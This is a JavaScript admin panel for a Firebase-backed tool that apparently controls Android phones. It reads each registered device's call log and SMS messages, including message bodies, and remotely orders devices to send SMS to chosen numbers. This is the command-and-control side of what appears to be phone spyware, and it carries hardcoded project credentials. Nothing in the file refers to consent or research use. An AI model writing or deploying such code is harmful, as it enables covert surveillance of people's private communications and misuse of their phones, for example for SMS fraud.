// Debuggable admin.js — paste exactly
const firebaseConfig = {
  apiKey: "AIzaSyDNinF16mksrq4j96oj3bOyQvDUjvMjIY8",
  authDomain: "learner-tool.firebaseapp.com",
  databaseURL: "https://learner-tool-default-rtdb.firebaseio.com",
  projectId: "learner-tool",
  storageBucket: "learner-tool.firebasestorage.app",
  messagingSenderId: "953487025826",
  appId: "1:953487025826:web:012054d8cb9f57d9b4d9fb"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();

const logBox = document.createElement('pre');
logBox.id = 'debugLog';
logBox.style.cssText = 'position:fixed;right:10px;bottom:10px;max-width:380px;max-height:200px;overflow:auto;background:#0e1626;border:1px solid #223152;padding:8px;border-radius:8px;color:#9aa7bd;font-size:12px;z-index:9999';
document.body.appendChild(logBox);
function debug(msg, obj) {
  const line = '[' + new Date().toLocaleTimeString() + '] ' + msg + (obj ? ' ' + JSON.stringify(obj) : '');
  console.log(line, obj || '');
  logBox.textContent = line + '\n' + logBox.textContent;
}

const devicesBody = document.getElementById('devicesBody');
const detailsTitle = document.getElementById('detailsTitle');
const profileBox = document.getElementById('profileBox');
const callsBody = document.getElementById('callsBody');
const smsBody = document.getElementById('smsBody');
const smsForm = document.getElementById('smsForm');
const smsTo = document.getElementById('smsTo');
const smsMessage = document.getElementById('smsMessage');
const smsStatus = document.getElementById('smsStatus');
const lastResultBox = document.getElementById('lastResultBox');

let selectedUid = null;

debug('Starting admin.js');

auth.signInAnonymously()
  .then(userCred => {
    debug('Signed in anonymously', { uid: userCred.user.uid });
  })
  .catch(err => {
    debug('Auth signIn error', err.message);
  });

auth.onAuthStateChanged(user => {
  debug('Auth state changed', user ? { uid: user.uid } : null);
  if (!user) {
    // not signed in
    return;
  }

  // watch high-level DB read permissions quickly: try a test read
  db.ref('.info/connected').once('value')
    .then(snap => debug('.info/connected read OK', snap.val()))
    .catch(err => debug('.info/connected read failed', err.message));

  // main devices listener
  db.ref('devices').on('value', snap => {
    const val = snap.val() || {};
    debug('devices snapshot received, count=' + Object.keys(val).length);
    renderDevices(val);
  }, err => {
    debug('devices listener error', err.message);
  });

  if (selectedUid) {
    watchLastResult(selectedUid);
  }
});

function renderDevices(devices) {
  devicesBody.innerHTML = '';
  const entries = Object.entries(devices);
  entries.sort((a, b) => (b[1]?.last_checkin || 0) - (a[1]?.last_checkin || 0));
  for (const [uid, d] of entries) {
    const tr = document.createElement('tr');
    tr.onclick = () => selectDevice(uid, d);
    const name = d.device_name || d.model || uid;
    const model = d.model || '-';
    const os = d.os_version || '-';
    const last = d.last_checkin ? new Date(d.last_checkin).toLocaleString() : '-';
    tr.innerHTML = `<td>${escapeHtml(name)}</td><td>${escapeHtml(model)}</td><td>${escapeHtml(os)}</td><td>${escapeHtml(last)}</td><td><button type="button">Open</button></td>`;
    devicesBody.appendChild(tr);
  }
}

function selectDevice(uid, device) {
  debug('Device selected', { uid });
  selectedUid = uid;
  detailsTitle.textContent = `Device Details – ${device.device_name || device.model || uid}`;
  profileBox.textContent = JSON.stringify(device, null, 2);

  db.ref(`devices/${uid}/calls`).limitToLast(100).on('value', snap => {
    renderCalls(snap.val() || {});
  }, err => debug('calls listener error', err.message));

  db.ref(`devices/${uid}/sms`).limitToLast(100).on('value', snap => {
    renderSms(snap.val() || {});
  }, err => debug('sms listener error', err.message));

  watchLastResult(uid);

  smsForm.onsubmit = e => {
    e.preventDefault();
    sendSmsCommand(uid, smsTo.value.trim(), smsMessage.value.trim());
  };
}

function renderCalls(calls) {
  callsBody.innerHTML = '';
  const rows = Object.values(calls || {});
  rows.sort((a, b) => (b.time || 0) - (a.time || 0));
  for (const c of rows) {
    const tr = document.createElement('tr');
    const when = c.time ? new Date(c.time).toLocaleString() : '-';
    const type = c.type || '-';
    const num = c.number || '-';
    const dur = (c.duration_sec != null) ? `${c.duration_sec}s` : '-';
    tr.innerHTML = `<td>${escapeHtml(when)}</td><td>${escapeHtml(type)}</td><td>${escapeHtml(num)}</td><td>${escapeHtml(dur)}</td>`;
    callsBody.appendChild(tr);
  }
}

function renderSms(list) {
  smsBody.innerHTML = '';
  const rows = Object.values(list || {});
  rows.sort((a, b) => (b.time || 0) - (a.time || 0));
  for (const s of rows) {
    const tr = document.createElement('tr');
    const when = s.time ? new Date(s.time).toLocaleString() : '-';
    const dir = s.direction || '-';
    const addr = s.address || '-';
    const body = s.body ? escapeHtml(s.body) : '';
    tr.innerHTML = `<td>${escapeHtml(when)}</td><td>${escapeHtml(dir)}</td><td>${escapeHtml(addr)}</td><td>${body}</td>`;
    smsBody.appendChild(tr);
  }
}

function sendSmsCommand(uid, to, message) {
  if (!to || !message) {
    smsStatus.textContent = 'Enter number & message.';
    return;
  }
  smsStatus.textContent = 'Writing command…';
  debug('Writing command', { uid, to });
  db.ref(`commands/${uid}/send_sms`).set({ to, message, requested_at: Date.now() })
    .then(() => {
      debug('Command written');
      smsStatus.textContent = 'Command written. Waiting for device result...';
      smsMessage.value = '';
    })
    .catch(err => {
      debug('Error writing command', err.message);
      smsStatus.textContent = 'Write error: ' + err.message;
    });
}

function watchLastResult(uid) {
  db.ref(`commands/${uid}/last_result`).on('value', snap => {
    lastResultBox.textContent = JSON.stringify(snap.val() || {info: 'No results yet'}, null, 2);
    debug('last_result update', snap.val());
  }, err => debug('last_result listener error', err.message));
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
